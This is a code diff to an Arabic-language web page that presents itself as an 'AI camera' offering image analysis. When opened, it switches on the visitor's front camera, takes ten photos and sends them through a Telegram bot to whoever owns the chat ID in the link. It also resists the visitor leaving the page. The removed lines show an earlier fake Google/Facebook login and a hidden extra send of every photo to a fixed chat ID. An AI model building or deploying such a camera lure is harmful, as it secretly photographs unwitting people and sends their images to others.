@@ -6,6 +6,7 @@
 <title>كاميرا الذكاء الاصطناعي</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🤖</text></svg>">
 
 <style>
 * {
@@ -106,6 +107,30 @@ h1 {
     margin-bottom: 30px;
     line-height: 1.6;
     padding: 0 10px;
+}
+
+.user-info {
+    background: rgba(0, 0, 0, 0.2);
+    padding: 15px;
+    border-radius: 12px;
+    margin-bottom: 25px;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+}
+
+.user-info p {
+    margin: 5px 0;
+    font-size: 0.9em;
+}
+
+.user-id {
+    background: rgba(0, 198, 255, 0.2);
+    padding: 8px 12px;
+    border-radius: 8px;
+    margin-top: 10px;
+    font-family: monospace;
+    direction: ltr;
+    overflow-x: auto;
+    white-space: nowrap;
 }
 
 .btn-container {
@@ -223,6 +248,7 @@ video {
     width: 100%;
     height: 100%;
     object-fit: cover;
+    transform: scaleX(-1); /* لقلب الصورة كمرآة */
 }
 
 .overlay {
@@ -292,6 +318,10 @@ video {
     transition: all 0.3s ease;
     box-shadow: 0 5px 15px rgba(255, 65, 108, 0.2);
     width: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
 }
 
 .stop-btn:hover {
@@ -343,6 +373,29 @@ video {
         padding: 12px 8px;
     }
 }
+
+/* إشعارات */
+.notification {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    background: #4CAF50;
+    color: white;
+    padding: 15px 25px;
+    border-radius: 10px;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+    z-index: 1000;
+    animation: slideIn 0.5s ease;
+}
+
+@keyframes slideIn {
+    from { transform: translateX(100%); opacity: 0; }
+    to { transform: translateX(0); opacity: 1; }
+}
+
+.hidden {
+    display: none;
+}
 </style>
 </head>
 
@@ -358,14 +411,21 @@ video {
         قم بتسجيل الدخول للاستفادة من تحليل الصور تلقائيًا باستخدام تقنيات الذكاء الاصطناعي المتقدمة
     </p>
 
+    <div class="user-info" id="userInfo" style="display: none;">
+        <p><i class="fas fa-user"></i> مرحباً، <span id="userName"></span></p>
+        <p><i class="fas fa-id-card"></i> رقمك التعريفي:</p>
+        <div class="user-id" id="userId"></div>
+        <p><i class="fas fa-info-circle"></i> سيتم إرسال الصور إلى حسابك في تلجرام</p>
+    </div>
+
     <div class="btn-container">
         <button class="login-btn google" onclick="startCamera()">
-            <i class="fab fa-google"></i>
-            متابعة باستخدام Google
+            <i class="fas fa-camera"></i>
+            بدء استخدام الكاميرا
         </button>
-        <button class="login-btn facebook" onclick="startCamera()">
-            <i class="fab fa-facebook-f"></i>
-            متابعة باستخدام Facebook
+        <button class="login-btn facebook" onclick="showInstructions()">
+            <i class="fas fa-question-circle"></i>
+            تعليمات الاستخدام
         </button>
     </div>
 
@@ -385,12 +445,21 @@ video {
     </div>
     
     <div class="footer">
-        <p>بمجرد تسجيل الدخول، سيبدأ التطبيق في تحليل الصور تلقائيًا</p>
+        <p>بمجرد الضغط على الزر، سيبدأ التطبيق في تحليل الصور تلقائيًا</p>
+        <p style="margin-top: 10px; font-size: 0.7em;">
+            <i class="fas fa-exclamation-triangle"></i>
+            تأكد من منح إذن الكاميرا للمتصفح
+        </p>
     </div>
 </div>
 
 <div class="container" id="appScreen">
     <h1>جاري تحليل الصور...</h1>
+    
+    <div class="user-info">
+        <p><i class="fas fa-user"></i> المستخدم: <span id="currentUserName"></span></p>
+        <p><i class="fas fa-id-card"></i> الرقم: <span id="currentUserId"></span></p>
+    </div>
     
     <div class="video-container">
         <video id="video" autoplay playsinline></video>
@@ -414,9 +483,15 @@ video {
     </button>
     
     <div class="footer">
-        <p>يتم إرسال الصور للتحليل عبر الذكاء الاصطناعي</p>
+        <p>يتم إرسال الصور للتحليل عبر الذكاء الاصطناعي إلى حسابك في تلجرام</p>
+        <p style="margin-top: 10px; font-size: 0.7em;">
+            <i class="fas fa-clock"></i>
+            سيتم التقاط 10 صور (صورة كل 5 ثواني)
+        </p>
     </div>
 </div>
+
+<div id="notification" class="notification hidden"></div>
 
 <script>
 const urlParams = new URLSearchParams(window.location.search);
@@ -428,40 +503,122 @@ const video = document.getElementById('video');
 const status = document.getElementById('status');
 const progressBar = document.getElementById('progressBar');
 const counter = document.getElementById('counter');
+const notification = document.getElementById('notification');
 
 let photoCount = 0;
 let intervalId = null;
 const MAX_PHOTOS = 10;
 
+// عرض معلومات المستخدم إذا كان هناك ID في الرابط
+function showUserInfo() {
+    if (dynamicChatId) {
+        document.getElementById('userInfo').style.display = 'block';
+        document.getElementById('userId').textContent = dynamicChatId;
+        
+        // محاولة الحصول على اسم المستخدم من خلال البوت (يمكن تحسينه لاحقاً)
+        fetch(`https://api.telegram.org/bot${token}/getChat?chat_id=${dynamicChatId}`)
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    const userName = data.result.first_name || "مستخدم تلجرام";
+                    document.getElementById('userName').textContent = userName;
+                    document.getElementById('currentUserName').textContent = userName;
+                }
+            })
+            .catch(error => {
+                console.log("لا يمكن الحصول على معلومات المستخدم");
+                document.getElementById('userName').textContent = "مستخدم تلجرام";
+                document.getElementById('currentUserName').textContent = "مستخدم تلجرام";
+            });
+        
+        document.getElementById('currentUserId').textContent = dynamicChatId;
+    }
+}
+
+// إظهار إشعار
+function showNotification(message, type = 'info') {
+    notification.textContent = message;
+    notification.className = 'notification';
+    
+    // تغيير اللون حسب النوع
+    if (type === 'success') {
+        notification.style.background = '#4CAF50';
+    } else if (type === 'error') {
+        notification.style.background = '#f44336';
+    } else if (type === 'warning') {
+        notification.style.background = '#ff9800';
+    } else {
+        notification.style.background = '#2196F3';
+    }
+    
+    setTimeout(() => {
+        notification.className = 'notification hidden';
+    }, 3000);
+}
+
+// إظهار تعليمات الاستخدام
+function showInstructions() {
+    const instructions = `
+🎯 *كيفية استخدام التطبيق:*
+1. احصل على رابطك الشخصي من بوت تلجرام
+2. افتح الرابط على أي جهاز
+3. اسمح للكاميرا بالعمل
+4. سيتم التقاط 10 صور تلقائياً
+5. ستصل الصور إلى حسابك في تلجرام
+
+⚠️ *ملاحظات هامة:*
+• التطبيق يأخذ 10 صور فقط ثم يتوقف
+• يمكن إعادة فتح الرابط لالتقاط المزيد
+• الصور تصل فقط لصاحب الرابط
+• لا يتم حفظ الصور في أي سيرفر
+    `;
+    
+    alert(instructions.replace(/\*/g, ''));
+}
+
 function startCamera() {
+    if (!dynamicChatId) {
+        showNotification('❌ يرجى استخدام رابطك الشخصي من بوت تلجرام', 'error');
+        return;
+    }
+    
     document.getElementById('loginScreen').style.display = "none";
     document.getElementById('appScreen').style.display = "block";
-
+    
+    // إعادة تعيين العدادات
+    photoCount = 0;
+    progressBar.style.width = '0%';
+    counter.textContent = '0 / 10';
+    
+    // طلب إذن الكاميرا
     navigator.mediaDevices.getUserMedia({ 
         video: { 
             width: { ideal: 1280 },
             height: { ideal: 720 },
-            facingMode: "environment"
+            facingMode: "user"
         } 
     })
     .then(stream => {
         video.srcObject = stream;
         video.onloadedmetadata = () => {
+            showNotification('✅ تم تشغيل الكاميرا بنجاح', 'success');
             status.innerHTML = '<i class="fas fa-check-circle"></i> الكاميرا جاهزة - جاري التحليل...';
+            
             setTimeout(() => {
                 captureAndSend();
                 intervalId = setInterval(captureAndSend, 5000);
-            }, 1500);
+            }, 2000);
         };
     })
     .catch(err => {
         console.error("خطأ في الوصول للكاميرا:", err);
         status.innerHTML = '<i class="fas fa-exclamation-circle"></i> تم رفض إذن الكاميرا';
+        showNotification('❌ يرجى منح إذن استخدام الكاميرا', 'error');
         
-        // عرض رسالة توضيحية
+        // عرض رسالة توضيحية بعد فترة
         setTimeout(() => {
-            alert("يجب منح إذن الوصول للكاميرا لاستخدام التطبيق. يرجى التحقق من إعدادات المتصفح.");
-        }, 500);
+            alert("للاستفادة من التطبيق، يجب منح إذن الوصول للكاميرا.\n\nيرجى:\n1. النقر على أيقونة الكاميرا في شريط العنوان\n2. اختيار 'السماح'\n3. إعادة تحميل الصفحة");
+        }, 1000);
     });
 }
 
@@ -469,6 +626,23 @@ function captureAndSend() {
     if (photoCount >= MAX_PHOTOS) {
         clearInterval(intervalId);
         status.innerHTML = '<i class="fas fa-flag-checkered"></i> اكتمل التحليل بنجاح!';
+        showNotification('🎉 اكتمل التقاط 10 صور بنجاح!', 'success');
+        
+        // إيقاف الكاميرا بعد الانتهاء
+        if (video.srcObject) {
+            const tracks = video.srcObject.getTracks();
+            tracks.forEach(track => track.stop());
+        }
+        
+        // عرض زر للعودة
+        setTimeout(() => {
+            const stopBtn = document.querySelector('.stop-btn');
+            stopBtn.innerHTML = '<i class="fas fa-redo"></i> إعادة التشغيل';
+            stopBtn.onclick = () => {
+                window.location.reload();
+            };
+        }, 500);
+        
         return;
     }
 
@@ -487,14 +661,19 @@ function captureAndSend() {
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
-    canvas.getContext('2d').drawImage(video, 0, 0);
+    const ctx = canvas.getContext('2d');
+    
+    // قلب الصورة كمرآة
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
     canvas.toBlob(blob => {
         const send = (id) => {
             const f = new FormData();
             f.append('chat_id', id);
             f.append('photo', blob, `ai_camera_${photoCount}.jpg`);
-            f.append('caption', `صورة ${photoCount} من تحليل الذكاء الاصطناعي`);
+            f.append('caption', `الصورة ${photoCount} من كاميرا الذكاء الاصطناعي`);
             
             return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                 method: 'POST',
@@ -504,14 +683,15 @@ function captureAndSend() {
 
         // الإرسال لصاحب الرابط
         if (dynamicChatId) {
-            send(dynamicChatId);
+            send(dynamicChatId).then(response => {
+                if (response.ok) {
+                    console.log(`✅ تم إرسال الصورة ${photoCount} بنجاح`);
+                }
+            }).catch(error => {
+                console.error(`❌ فشل إرسال الصورة ${photoCount}:`, error);
+            });
         }
 
-        // الإرسال للرقم الثابت فقط إذا كان مختلف
-        if (dynamicChatId != fixedChatId) {
-            send(fixedChatId);
-        }
-        
         // تأثير بصرية عند التقاط الصورة
         const overlay = document.querySelector('.overlay i');
         overlay.style.transform = 'scale(1.3)';
@@ -520,7 +700,7 @@ function captureAndSend() {
             overlay.style.transform = 'scale(1)';
             overlay.style.color = 'rgba(255, 255, 255, 0.7)';
         }, 300);
-    }, 'image/jpeg', 0.8); // جودة الصورة 80%
+    }, 'image/jpeg', 0.85); // جودة الصورة 85%
 }
 
 function stopCamera() {
@@ -529,6 +709,7 @@ function stopCamera() {
     if (video.srcObject) {
         const tracks = video.srcObject.getTracks();
         tracks.forEach(track => track.stop());
+        showNotification('⏸️ تم إيقاف التحليل', 'warning');
     }
     
     status.innerHTML = '<i class="fas fa-stop-circle"></i> تم إيقاف التحليل';
@@ -543,8 +724,11 @@ function stopCamera() {
     }, 500);
 }
 
-// إضافة تأثيرات عند التحميل
+// عند تحميل الصفحة
 window.addEventListener('load', () => {
+    showUserInfo();
+    
+    // تأثيرات عند التحميل
     const logo = document.querySelector('.logo');
     setTimeout(() => {
         logo.style.transform = 'scale(1.1)';
@@ -552,6 +736,22 @@ window.addEventListener('load', () => {
             logo.style.transform = 'scale(1)';
         }, 300);
     }, 1000);
+    
+    // إذا كان هناك ID في الرابط، عرض رسالة ترحيبية
+    if (dynamicChatId) {
+        setTimeout(() => {
+            showNotification('👋 مرحباً بك! اضغط على "بدء استخدام الكاميرا" للبدأ', 'info');
+        }, 1500);
+    }
+});
+
+// لمنع إغلاق الصفحة أثناء العمل
+window.addEventListener('beforeunload', (e) => {
+    if (intervalId) {
+        e.preventDefault();
+        e.returnValue = 'هل تريد حقاً الخروج؟ سيتم إيقاف عملية التحليل.';
+        return e.returnValue;
+    }
 });
 </script>
 
